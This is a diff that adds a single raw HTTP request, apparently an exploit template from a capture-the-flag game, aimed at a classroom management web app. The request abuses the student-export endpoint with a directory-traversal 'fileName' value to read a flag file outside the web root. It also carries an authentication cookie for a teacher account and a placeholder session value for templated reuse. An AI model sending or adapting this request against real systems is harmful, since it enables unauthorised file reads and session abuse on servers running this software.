@@ -1,0 +1,7 @@
+GET /app.php/classroom/1/manage/student/export?role=student&fileName=/var/www/html/app/data/private_files/../../../../../../../../../../../home/ctf/a/../flag HTTP/1.1
+Host: 172.16.5.28:5053
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.18.1
+Cookie: REMEMBERME=Qml6XFVzZXJcQ3VycmVudFVzZXI6ZEdWaFkyaGxja0IwWldGamFHVnlMblJsWVdOb1pYST06MTU1NTIxNzYzMDo5MjhhYmE3NzA4MzkyOWI1NzZjYjZhNWM2NTA2MjQwMTZhM2RkOWMzNmM3ZWZjNDFhZDFiZTJjMGRhZjRhMTNm; PHPSESSID={{cookie}}
